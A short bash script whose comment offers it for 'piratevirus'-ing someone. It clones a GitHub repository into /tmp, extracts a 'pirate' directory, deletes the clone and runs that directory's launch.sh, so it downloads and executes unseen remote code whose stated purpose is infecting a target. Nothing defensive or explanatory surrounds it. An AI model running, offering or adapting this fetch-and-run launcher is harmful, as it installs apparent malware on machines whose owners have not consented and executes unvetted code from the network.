#!/bin/bash

# If you just want to piratevirus someone

cd /tmp
git clone https://github.com/phobosgroup/dtc2.git
cd dtc2
mv pirate ../
cd ../
rm -rf dtc2
cd pirate
sh launch.sh
